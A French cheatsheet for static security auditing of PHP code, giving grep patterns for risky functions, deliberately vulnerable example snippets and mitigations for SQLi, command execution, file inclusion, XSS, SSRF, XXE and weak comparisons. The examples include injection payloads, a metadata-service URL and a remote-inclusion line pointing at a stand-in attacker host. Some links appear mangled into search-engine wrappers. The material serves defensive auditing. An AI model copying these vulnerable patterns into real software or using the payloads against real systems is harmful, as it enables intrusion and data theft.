
**Objectif :** Identifier rapidement les points potentiellement vulnérables dans une base de code PHP lors d'un audit de sécurité statique (SAST - Static Application Security Testing). Cette cheatsheet se concentre sur des fonctions et des patterns connus pour être souvent sources de vulnérabilités.

**Note :** L'audit statique doit être complété par un audit dynamique et une compréhension du contexte d'exécution. La présence d'une fonction listée ici n'implique pas *automatiquement* une vulnérabilité si les entrées sont correctement validées et échappées.

---

### ⚙️ **Outils d'Analyse Statique (SAST) pour PHP**

Avant de chercher manuellement, envisagez d'utiliser des outils SAST qui automatisent une partie de la détection :

* **PHPStan** ([https://github.com/phpstan/phpstan](https://github.com/phpstan/phpstan))
* **Psalm** ([https://github.com/vimeo/psalm](https://github.com/vimeo/psalm))
* **SonarQube (avec SonarPHP)** ([https://www.sonarsource.com/products/sonarqube/](https://www.sonarsource.com/products/sonarqube/))
* **Semgrep** ([https://github.com/semgrep/semgrep](https://github.com/semgrep/semgrep)) - Avec des règles spécifiques PHP.
* **PHP CS Fixer / PHP CodeSniffer** : Plus pour le style, mais peuvent aider à repérer des pratiques non standard.

---

### 🎯 **Recherche Manuelle par Type de Vulnérabilité (`grep`)**

*(Exécutez ces commandes à la racine du code source)*

#### 💉 **Injection SQL (SQLi)**

* **Recherche :** Fonctions exécutant des requêtes sans préparation adéquate.
```bash
# Fonctions de base de données classiques (ex: mysqli, pdo)
grep -RinE --include=*.php '(mysqli_query|query\(|->query\(|execute\(|->execute\()' .
# Fonctions PDO spécifiques (prepare est bien, mais vérifier comment les variables sont liées)
grep -RinE --include=*.php 'prepare\(|->prepare\(' .
# Recherche de concaténation directe de variables dans les requêtes
grep -RinE --include=*.php 'SELECT .*[\$\_](GET|POST|REQUEST|COOKIE)|INSERT .*[\$\_](GET|POST|REQUEST|COOKIE)|UPDATE .*[\$\_](GET|POST|REQUEST|COOKIE)|DELETE .*[\$\_](GET|POST|REQUEST|COOKIE)' .
```
* **Exemple Vulnérable :**
```php
<?php
$id = $_GET['id'];
$result = $mysqli->query("SELECT * FROM products WHERE id = " . $id); // Injection possible ici
?>
```
* **Mitigation :** Utiliser systématiquement les requêtes préparées (Prepared Statements) avec `mysqli_prepare` / `bind_param` / `execute` ou PDO (`prepare`, `bindParam`/`bindValue`, `execute`).

#### 🛰️ **Exécution de Commandes (RCE - Remote Code Execution)**

* **Recherche :** Fonctions exécutant des commandes système ou interprétant du code.
```bash
grep -RinE --include=*.php '(system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec|`.*`|eval|assert|create_function|include|require|include_once|require_once)' .
# Spécifiquement pour les backticks (opérateur d'exécution)
grep -Rin --include=*.php '`' .
```
* **Exemple Vulnérable (`shell_exec`) :**
```php
<?php
$cmd = $_GET['cmd'];
echo shell_exec('ping -c 3 ' . $cmd); // RCE via injection de commande (ex: ; ls -la)
?>
```
* **Exemple Vulnérable (`eval`) :**
```php
<?php
$code = $_GET['code'];
eval("\$result = " . $code . ";"); // RCE directe si $code contient du PHP malveillant
?>
```
* **Mitigation :** Éviter autant que possible ces fonctions avec des entrées utilisateur. Si nécessaire, utiliser `escapeshellarg()` ou `escapeshellcmd()` (avec prudence, ne protège pas de tout) et valider très strictement les entrées (liste blanche). Éviter `eval`, `assert`, `create_function` avec des données externes.

#### 🪂 **Inclusion de Fichiers (LFI/RFI - Local/Remote File Inclusion)**

* **Recherche :** Fonctions incluant des fichiers basés sur une entrée.
```bash
grep -RinE --include=*.php '(include|require|include_once|require_once)\s*\(?[\s"\']?[\$\_](GET|POST|REQUEST|COOKIE)' .
# Fonctions de lecture de fichiers pouvant mener à LFI ou Directory Traversal
grep -RinE --include=*.php '(file_get_contents|fopen|file|readfile)\s*\(?[\s"\']?[\$\_](GET|POST|REQUEST|COOKIE)' .
```
* **Exemple Vulnérable (LFI) :**
```php
<?php
$page = $_GET['page'];
include($page . '.php'); // LFI possible avec ../../.. ou wrappers php://
?>
```
* **Exemple Vulnérable (RFI - si `allow_url_include=On`) :**
```php
<?php
$module = $_GET['module'];
include($module); // RFI possible si $module = [http://attaquant.com/shell.txt](https://www.google.com/search?q=http://attaquant.com/shell.txt)
?>
```
* **Mitigation :** Ne **jamais** inclure de fichiers basés directement sur une entrée utilisateur. Utiliser une liste blanche (whitelist) de fichiers autorisés. Désactiver `allow_url_fopen` et `allow_url_include` dans `php.ini` si possible. Utiliser `basename()` ou valider strictement le chemin.

#### 🚶 **Directory Traversal**

* **Recherche :** Utilisation de fonctions de fichiers avec des chemins potentiellement contrôlés par l'utilisateur.
```bash
grep -RinE --include=*.php '(fopen|file_get_contents|file_put_contents|readfile|unlink|copy|rename|mkdir|rmdir|scandir|glob)\s*\(?[\s"\']?[\$\_](GET|POST|REQUEST|COOKIE)' .
```
* **Exemple Vulnérable :**
```php
<?php
$filename = $_GET['file'];
$content = file_get_contents('/var/www/app/user_files/' . $filename); // Traversal possible avec $filename = ../../etc/passwd
?>
```
* **Mitigation :** Valider et nettoyer les chemins (`basename()`), vérifier que le chemin résolu (`realpath()`) reste dans le répertoire attendu (chroot virtuel).

#### 🧁 **Cross-Site Scripting (XSS)**

* **Recherche :** Affichage direct de données utilisateur sans échappement HTML.
```bash
grep -RinE --include=*.php '(echo|print|<\?=)[\s\(]*[\$\_](GET|POST|REQUEST|COOKIE)' .
```
* **Exemple Vulnérable :**
```php
<?php
$name = $_GET['name'];
echo "<h1>Bonjour, " . $name . "</h1>"; // XSS possible si name contient <script>alert(1)</script>
?>
```
* **Mitigation :** Utiliser `htmlspecialchars($variable, ENT_QUOTES, 'UTF-8')` ou des moteurs de template sécurisés (Twig, Blade) qui échappent par défaut. Définir l'en-tête `Content-Security-Policy`.

#### 📤 **File Upload Vulnerabilities**

* **Recherche :** Traitement des fichiers uploadés (`$_FILES`).
```bash
grep -Rin --include=*.php '\$_FILES\[' .
grep -RinE --include=*.php '(move_uploaded_file|copy)\s*\(?.*[\$\_]FILES' .
```
* **Points à vérifier :**
    * Validation du type de fichier (MIME type `$_FILES['userfile']['type']` **n'est pas fiable**, vérifier l'extension et idéalement le contenu/magic bytes).
    * Validation de la taille (`$_FILES['userfile']['size']`).
    * Contrôle du nom de fichier (éviter les `..`, les extensions multiples `shell.php.jpg`, générer un nom aléatoire).
    * Stockage des fichiers uploadés en dehors du webroot ou avec des permissions très restrictives (pas d'exécution).
    * Utilisation de `move_uploaded_file()` plutôt que `copy()`.
* **Mitigation :** Valider type, taille, nom. Renommer les fichiers. Stocker hors webroot ou configurer le serveur web pour ne pas exécuter de code dans le dossier d'upload.

#### 🔓 **Insecure Deserialization**

* **Recherche :** Utilisation de la fonction `unserialize()` sur des données contrôlées par l'utilisateur.
```bash
grep -RinE --include=*.php 'unserialize\s*\(?[\s"\']?[\$\_](GET|POST|REQUEST|COOKIE)' .
```
* **Exemple Vulnérable :**
```php
<?php
    $user_data = unserialize($_COOKIE['userdata']); // Dangereux si le cookie peut être manipulé
?>
```
* **Mitigation :** Ne **jamais** utiliser `unserialize()` sur des données non fiables. Préférer JSON (`json_decode`/`json_encode`) ou d'autres formats sérialisés sûrs. Si `unserialize` est inévitable, utiliser l'option `allowed_classes` (PHP 7+).

#### 🔗 **Server-Side Request Forgery (SSRF)**

* **Recherche :** Fonctions effectuant des requêtes HTTP/fichier basées sur une entrée utilisateur.
```bash
grep -RinE --include=*.php '(curl_exec|file_get_contents|fsockopen|fopen)\s*\(?.*[\$\_](GET|POST|REQUEST|COOKIE)' .
```
* **Exemple Vulnérable :**
```php
<?php
$url = $_GET['url'];
$content = file_get_contents($url); // SSRF si $url = [http://169.254.169.254/latest/meta-data/](https://www.google.com/search?q=http://169.254.169.254/latest/meta-data/) ou file:///etc/passwd
?>
```
* **Mitigation :** Valider strictement les URL (liste blanche de domaines/IPs autorisés). Ne pas autoriser les schémas `file://`, `gopher://`, etc. Configurer des pare-feux pour limiter les requêtes sortantes du serveur.

#### 🏛️ **XML External Entity (XXE)**

* **Recherche :** Traitement de fichiers XML avec des parseurs potentiellement mal configurés.
```bash
grep -RinE --include=*.php '(simplexml_load_string|simplexml_load_file|DOMDocument->load|DOMDocument->loadXML|xml_parse)' .
```
* **Exemple Vulnérable (avant PHP 8) :**
```php
<?php
libxml_disable_entity_loader(false); // Active le chargement des entités externes (DANGEREUX)
$xml = $_POST['xml'];
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // XXE possible
?>
```
* **Mitigation :** Désactiver le chargement des entités externes : `libxml_disable_entity_loader(true);` (par défaut depuis PHP 8.0). Utiliser `LIBXML_NONET` lors du parsing si possible.

#### ⚖️ **Comparaisons Faibles (Weak Type Comparison)**

* **Recherche :** Utilisation de `==` au lieu de `===` pour des comparaisons, surtout avec des fonctions comme `strcmp`, `strpos`, ou lors de vérifications d'authentification/autorisation.
```bash
grep -RinE --include=*.php '\s==\s' . # Très générique, affinage nécessaire
grep -RinE --include=*.php '(strcmp|strpos)\s*\(.*?\)\s*==\s*0' . # strcmp/strpos peuvent retourner 0 ou false
```
* **Exemple Vulnérable (`strcmp`) :**
```php
<?php
// Si $password est un tableau envoyé par l'attaquant (ex: password[]=), strcmp retourne NULL.
// NULL == 0 est TRUE en comparaison faible !
if (strcmp($_POST['password'], $stored_password) == 0) {
echo "Login réussi!";
}
?>
```
* **Mitigation :** Utiliser la comparaison stricte `===` qui vérifie aussi le type. Pour `strcmp`, vérifier explicitement `strcmp(...) === 0`. Pour `strpos`, vérifier `strpos(...) !== false`.
